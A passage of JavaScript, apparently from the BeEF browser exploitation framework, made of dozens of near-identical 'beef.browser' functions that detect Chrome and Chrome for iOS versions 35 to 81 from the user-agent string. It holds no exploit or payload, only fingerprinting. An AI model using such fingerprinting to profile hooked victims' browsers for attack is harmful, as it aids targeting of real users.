        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 35.
     * @example: beef.browser.isC35iOS()
     */
    isC35iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome 36.
     * @example: beef.browser.isC36()
     */
    isC36: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 36.
     * @example: beef.browser.isC36iOS()
     */
    isC36iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome 37.
     * @example: beef.browser.isC37()
     */
    isC37: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 37.
     * @example: beef.browser.isC37iOS()
     */
    isC37iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome 38.
     * @example: beef.browser.isC38()
     */
    isC38: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 38.
     * @example: beef.browser.isC38iOS()
     */
    isC38iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome 39.
     * @example: beef.browser.isC39()
     */
    isC39: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 39.
     * @example: beef.browser.isC39iOS()
     */
    isC39iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome 40.
     * @example: beef.browser.isC40()
     */
    isC40: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 40.
     * @example: beef.browser.isC40iOS()
     */
    isC40iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome 41.
     * @example: beef.browser.isC41()
     */
    isC41: function() {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 41.
     * @example: beef.browser.isC41iOS()
     */
    isC41iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome 42.
     * @example: beef.browser.isC42()
     */
    isC42: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 42.
     * @example: beef.browser.isC42iOS()
     */
    isC42iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome 43.
     * @example: beef.browser.isC43()
     */
    isC43: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 43.
     * @example: beef.browser.isC43iOS()
     */
    isC43iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome 44.
     * @example: beef.browser.isC44()
     */
    isC44: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 44.
     * @example: beef.browser.isC44iOS()
     */
    isC44iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome 45.
     * @example: beef.browser.isC45()
     */
    isC45: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 45.
     * @example: beef.browser.isC45iOS()
     */
    isC45iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome 46.
     * @example: beef.browser.isC46()
     */
    isC46: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 46.
     * @example: beef.browser.isC46iOS()
     */
    isC46iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome 47.
     * @example: beef.browser.isC47()
     */
    isC47: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 47.
     * @example: beef.browser.isC47iOS()
     */
    isC47iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome 48.
     * @example: beef.browser.isC48()
     */
    isC48: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 48.
     * @example: beef.browser.isC48iOS()
     */
    isC48iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome 49.
     * @example: beef.browser.isC49()
     */
    isC49: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 49.
     * @example: beef.browser.isC49iOS()
     */
    isC49iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome 50.
     * @example: beef.browser.isC50()
     */
    isC50: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 50.
     * @example: beef.browser.isC50iOS()
     */
    isC50iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome 51.
     * @example: beef.browser.isC51()
     */
    isC51: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 51.
     * @example: beef.browser.isC51iOS()
     */
    isC51iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome 52.
     * @example: beef.browser.isC52()
     */
    isC52: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 52.
     * @example: beef.browser.isC52iOS()
     */
    isC52iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome 53.
     * @example: beef.browser.isC53()
     */
    isC53: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 53.
     * @example: beef.browser.isC53iOS()
     */
    isC53iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome 54.
     * @example: beef.browser.isC54()
     */
    isC54: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 54.
     * @example: beef.browser.isC54iOS()
     */
    isC54iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome 55.
     * @example: beef.browser.isC55()
     */
    isC55: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 55.
     * @example: beef.browser.isC55iOS()
     */
    isC55iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome 56.
     * @example: beef.browser.isC56()
     */
    isC56: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 56.
     * @example: beef.browser.isC56iOS()
     */
    isC56iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome 57.
     * @example: beef.browser.isC57()
     */
    isC57: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 57.
     * @example: beef.browser.isC57iOS()
     */
    isC57iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome 58.
     * @example: beef.browser.isC58()
     */
    isC58: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 58.
     * @example: beef.browser.isC58iOS()
     */
    isC58iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome 59.
     * @example: beef.browser.isC59()
     */
    isC59: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 59) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 59.
     * @example: beef.browser.isC59iOS()
     */
    isC59iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 59) ? true : false);
    },

    /**
     * Returns true if Chrome 60.
     * @example: beef.browser.isC60()
     */
    isC60: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 60) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 60.
     * @example: beef.browser.isC60iOS()
     */
    isC60iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 60) ? true : false);
    },

    /**
     * Returns true if Chrome 61.
     * @example: beef.browser.isC61()
     */
    isC61: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 61) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 61.
     * @example: beef.browser.isC61iOS()
     */
    isC61iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 61) ? true : false);
    },

    /**
     * Returns true if Chrome 62.
     * @example: beef.browser.isC62()
     */
    isC62: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 62) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 62.
     * @example: beef.browser.isC62iOS()
     */
    isC62iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 62) ? true : false);
    },

    /**
     * Returns true if Chrome 63.
     * @example: beef.browser.isC63()
     */
    isC63: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 63) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 63.
     * @example: beef.browser.isC63iOS()
     */
    isC63iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 63) ? true : false);
    },

    /**
     * Returns true if Chrome 64.
     * @example: beef.browser.isC64()
     */
    isC64: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 64) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 64.
     * @example: beef.browser.isC64iOS()
     */
    isC64iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 64) ? true : false);
    },

    /**
     * Returns true if Chrome 65.
     * @example: beef.browser.isC65()
     */
    isC65: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 65) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 65.
     * @example: beef.browser.isC65iOS()
     */
    isC65iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 65) ? true : false);
    },

    /**
     * Returns true if Chrome 66.
     * @example: beef.browser.isC66()
     */
    isC66: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 66) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 66.
     * @example: beef.browser.isC66iOS()
     */
    isC66iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 66) ? true : false);
    },

    /**
     * Returns true if Chrome 67.
     * @example: beef.browser.isC67()
     */
    isC67: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 67) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 67.
     * @example: beef.browser.isC67iOS()
     */
    isC67iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 67) ? true : false);
    },

    /**
     * Returns true if Chrome 68.
     * @example: beef.browser.isC68()
     */
    isC68: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 68) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 68.
     * @example: beef.browser.isC68iOS()
     */
    isC68iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 68) ? true : false);
    },

    /**
     * Returns true if Chrome 69.
     * @example: beef.browser.isC69()
     */
    isC69: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 69) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 69.
     * @example: beef.browser.isC69iOS()
     */
    isC69iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 69) ? true : false);
    },

    /**
     * Returns true if Chrome 70.
     * @example: beef.browser.isC70()
     */
    isC70: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 70) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 70.
     * @example: beef.browser.isC70iOS()
     */
    isC70iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 70) ? true : false);
    },

    /**
     * Returns true if Chrome 71.
     * @example: beef.browser.isC71()
     */
    isC71: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 71) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 71.
     * @example: beef.browser.isC71iOS()
     */
    isC71iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 71) ? true : false);
    },

    /**
     * Returns true if Chrome 72.
     * @example: beef.browser.isC72()
     */
    isC72: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 72) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 72.
     * @example: beef.browser.isC72iOS()
     */
    isC72iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 72) ? true : false);
    },

    /**
     * Returns true if Chrome 73.
     * @example: beef.browser.isC73()
     */
    isC73: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 73) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 73.
     * @example: beef.browser.isC73iOS()
     */
    isC73iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 73) ? true : false);
    },

    /**
     * Returns true if Chrome 74.
     * @example: beef.browser.isC74()
     */
    isC74: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 74) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 74.
     * @example: beef.browser.isC74iOS()
     */
    isC74iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 74) ? true : false);
    },

    /**
     * Returns true if Chrome 75.
     * @example: beef.browser.isC75()
     */
    isC75: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 75) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 75.
     * @example: beef.browser.isC75iOS()
     */
    isC75iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 75) ? true : false);
    },

    /**
     * Returns true if Chrome 76.
     * @example: beef.browser.isC76()
     */
    isC76: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 76) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 76.
     * @example: beef.browser.isC76iOS()
     */
    isC76iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 76) ? true : false);
    },

    /**
     * Returns true if Chrome 77.
     * @example: beef.browser.isC77()
     */
    isC77: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 77) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 77.
     * @example: beef.browser.isC77iOS()
     */
    isC77iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 77) ? true : false);
    },

    /**
     * Returns true if Chrome 78.
     * @example: beef.browser.isC78()
     */
    isC78: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 78) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 78.
     * @example: beef.browser.isC78iOS()
     */
    isC78iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 78) ? true : false);
    },

    /**
     * Returns true if Chrome 79.
     * @example: beef.browser.isC79()
     */
    isC79: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 79) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 79.
     * @example: beef.browser.isC79iOS()
     */
    isC79iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 79) ? true : false);
    },

    /**
     * Returns true if Chrome 80.
     * @example: beef.browser.isC80()
     */
    isC80: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 80) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 80.
     * @example: beef.browser.isC80iOS()
     */
    isC80iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 80) ? true : false);
    },

    /**
     * Returns true if Chrome 81.
     * @example: beef.browser.isC81()
     */
    isC81: function() {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 81) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 81.
     * @example: beef.browser.isC81iOS()
     */
    isC81iOS: function() {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 81) ? true : false);
    },

    /**
     * Returns true if Chrome 82.
     * @example: beef.browser.isC82()
     */
    isC82: function() {
